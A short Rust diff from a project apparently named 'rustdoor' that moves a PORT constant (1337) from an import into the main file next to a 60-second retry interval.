@@ -1,11 +1,10 @@
 use std::{thread, time};
 
-use rustdoor::communication::server::PORT;
-
 mod communication;
 pub mod os;
 
 const RETRY_INTERVAL_SECONDS: u64 = 60;
+const PORT: u32 = 1337;
 
 fn main() {
     loop {
